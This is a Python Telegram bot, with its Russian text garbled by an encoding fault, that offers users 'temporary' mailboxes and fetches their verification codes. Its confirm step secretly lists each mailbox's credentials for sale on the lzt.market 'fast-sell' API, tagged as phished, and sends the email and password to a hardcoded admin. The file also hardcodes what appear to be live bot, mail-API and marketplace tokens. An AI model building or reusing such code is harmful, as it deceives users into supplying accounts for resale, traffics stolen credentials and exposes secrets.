import logging
import requests
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
MAIL_FILE = 'mails.txt'
ADMIN_ID = 6607362264
BOT_TOKEN = "7876360553:AAHD0ZqjCQrdyzdw-d0ZV9MVE4fH70-6zFU"
FIRSTMAIL_API_KEY = "62292855-4c7b-4b3f-92e4-65be8ed20090"
LZT_API_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJzdWIiOjY5MjQ1MTEsImlzcyI6Imx6dCIsImV4cCI6MCwiaWF0IjoxNzQzNDMzNTU2LCJqdGkiOjc2MTAyMSwic2NvcGUiOiJiYXNpYyByZWFkIHBvc3QgY29udmVyc2F0ZSBwYXltZW50IGludm9pY2UgbWFya2V0In0.k2lLjLX_R90XzWEcP6Qp3EdG5smX1tyLyEJDqxsbk2At00KRUQIOY_wo0EuC6-Et5sU2d3XabOD-pwG32rnH8OvwfikC0VgoSuM5FEqDLxh8hiNtzQlW4hhI8pPsWi_8g7fUc6m34jI98ufNtUtz_Pxuoq8SU7q_Fmi8tVCfb-4"
RESET_INTERVAL = 86400

class MailService:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers = {
            "accept": "application/json",
            "X-API-KEY": FIRSTMAIL_API_KEY,
            "User-Agent": "MailBot/1.0"
        }

    def get_messages(self, email: str, password: str) -> dict:
        """–ü–æ–ª—É—á–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è –∏–∑ –ø–æ—á—Ç–æ–≤–æ–≥–æ —è—â–∏–∫–∞"""
        try:
            url = f"https://api.firstmail.ltd/v1/get/messages?username={email}&password={password}"
            response = self.session.get(url, timeout=10)
            logger.info(f"API Response: {response.status_code} - {response.text[:200]}")
            
            if response.status_code == 200:
                return response.json()
            return None
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ: {str(e)}")
            return None

    def check_lzt_validity(self, email: str, password: str) -> bool:
        """–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å –∞–∫–∫–∞—É–Ω—Ç–∞ —á–µ—Ä–µ–∑ LZT.API"""
        try:
            url = "https://prod-api.lzt.market/item/fast-sell"
            params = {
                "title": "Rigichka slivaet",
                "title_en": "Rigichka slivaet",
                "price": "5555",
                "category_id": "15",
                "currency": "rub",
                "item_origin": "fishing",
                "extended_guarantee": "-1"
            }
            
            payload = {
                "login_password": f"{email}:{password}",
                "extra": {"system": "laser"}
            }
            
            headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "authorization": f"Bearer {LZT_API_TOKEN}"
            }
            
            response = requests.post(
                url,
                params=params,
                json=payload,
                headers=headers,
                timeout=10
            )
            
            logger.info(f"LZT API Response: {response.status_code} - {response.text}")
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —É—Å–ø–µ—à–Ω–æ—Å—Ç—å –æ—Ç–≤–µ—Ç–∞
            if response.status_code == 200:
                return True
            return False
        except Exception as e:
            logger.error(f"LZT API error: {str(e)}")
            return False

class EmailBot:
    def __init__(self):
        self.mail_service = MailService()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /start"""
        keyboard = [[InlineKeyboardButton("–ü–æ–ª—É—á–∏—Ç—å –ø–æ—á—Ç—É", callback_data='get_mail')]]
        await update.message.reply_text(
            "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–æ—á—Ç—É:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—Å–µ—Ö callback-–∑–∞–ø—Ä–æ—Å–æ–≤"""
        query = update.callback_query
        await query.answer()
        user_data = context.user_data

        if 'emails' not in user_data:
            user_data['emails'] = []
        if 'last_reset' not in user_data:
            user_data['last_reset'] = time.time()

        if time.time() - user_data['last_reset'] > RESET_INTERVAL:
            user_data['emails'] = []
            user_data['last_reset'] = time.time()

        if query.data == 'get_mail':
            await self._handle_get_mail(query, user_data)
        elif query.data.startswith('get_code_'):
            await self._handle_get_code(query, user_data)
        elif query.data == 'get_new_mail':
            await self._handle_get_mail(query, user_data)
        elif query.data == 'confirm_change':
            await self._handle_confirm_change(query, user_data)
        elif query.data.startswith('confirm_'):
            await self._handle_final_confirm(query, user_data, context)

    async def _handle_get_mail(self, query, user_data):
        """–í—ã–¥–∞—Ç—å –Ω–æ–≤—É—é –ø–æ—á—Ç—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é"""
        mail = self._get_next_mail()
        if not mail:
            await query.message.reply_text("‚ùå –ó–∞–∫–æ–Ω—á–∏–ª–∏—Å—å –¥–æ—Å—Ç—É–ø–Ω—ã–µ –ø–æ—á—Ç—ã. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")
            return

        email, password = mail.split(':', 1)
        user_data['emails'].append({'email': email, 'password': password})

        keyboard = [
            [InlineKeyboardButton("üîÑ –ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥", callback_data=f'get_code_{len(user_data["emails"])-1}')],
            [InlineKeyboardButton("‚úâÔ∏è –ù–æ–≤–∞—è –ø–æ—á—Ç–∞", callback_data='get_new_mail')],
            [InlineKeyboardButton("‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–æ—á—Ç—É", callback_data='confirm_change')],
        ]

        await query.message.reply_text(
            f"üìß –í–∞—à–∞ –≤—Ä–µ–º–µ–Ω–Ω–∞—è –ø–æ—á—Ç–∞:\n\n"
            f"–õ–æ–≥–∏–Ω: <code>{email}</code>\n"
            f"–ü–∞—Ä–æ–ª—å: <code>{password}</code>\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )

    async def _handle_get_code(self, query, user_data):
        """–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥ –∏–∑ –ø–æ—á—Ç—ã"""
        index = int(query.data.split('_')[-1])
        mail = user_data['emails'][index]
        messages = self.mail_service.get_messages(mail['email'], mail['password'])

        if not messages:
            await query.message.reply_text("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è –∏–ª–∏ –∏—Ö –Ω–µ—Ç.")
            return

        latest_msg = messages[0] if isinstance(messages, list) else messages
        text = latest_msg.get('text', latest_msg.get('body', '–¢–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω'))

        await query.message.reply_text(
            f"üì© –ü–æ—Å–ª–µ–¥–Ω–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å {mail['email']}:\n\n{text}"
        )

    async def _handle_confirm_change(self, query, user_data):
        """–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Å–º–µ–Ω—ã –ø–æ—á—Ç—ã"""
        if not user_data.get('emails'):
            await query.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ—á—Ç.")
            return

        keyboard = [
            [InlineKeyboardButton(f"–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å {mail['email']}", callback_data=f'confirm_{i}')]
            for i, mail in enumerate(user_data['emails'])
        ]

        await query.message.reply_text(
            "–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ—á—Ç—É –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def _handle_final_confirm(self, query, user_data, context):
        """–§–∏–Ω–∞–ª—å–Ω–æ–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø–æ—á—Ç—ã"""
        index = int(query.data.split('_')[-1])
        mail = user_data['emails'][index]
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ LZT.API
        is_valid = self.mail_service.check_lzt_validity(mail['email'], mail['password'])

        status = "‚úÖ –í–ê–õ–ò–î–ù–ê" if is_valid else "‚ùå –ù–ï–í–ê–õ–ò–î–ù–ê"
        await context.bot.send_message(
            ADMIN_ID,
            f"–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø–æ—á—Ç—ã:\n\n"
            f"–°—Ç–∞—Ç—É—Å: {status}\n"
            f"–ü–æ—á—Ç–∞: {mail['email']}\n"
            f"–ü–∞—Ä–æ–ª—å: {mail['password']}\n\n"
            f"User ID: {query.from_user.id}"
        )

        await query.message.reply_text(
            f"–ü–æ—á—Ç–∞ {mail['email']} {'—É—Å–ø–µ—à–Ω–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞!' if is_valid else '–Ω–µ –ø—Ä–æ—à–ª–∞ –ø—Ä–æ–≤–µ—Ä–∫—É.'}"
        )

    def _get_next_mail(self) -> str:
        """–ü–æ–ª—É—á–∏—Ç—å —Å–ª–µ–¥—É—é—â—É—é –ø–æ—á—Ç—É –∏–∑ —Ñ–∞–π–ª–∞"""
        try:
            with open(MAIL_FILE, 'r+') as f:
                lines = f.readlines()
                if not lines:
                    return None
                f.seek(0)
                f.truncate()
                f.writelines(lines[1:])
            return lines[0].strip()
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞ —Å –ø–æ—á—Ç–∞–º–∏: {str(e)}")
            return None

def main():
    """–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞"""
    bot = EmailBot()
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", bot.start))
    app.add_handler(CallbackQueryHandler(bot.handle_callback))
    
    app.run_polling()

if __name__ == "__main__":
    main()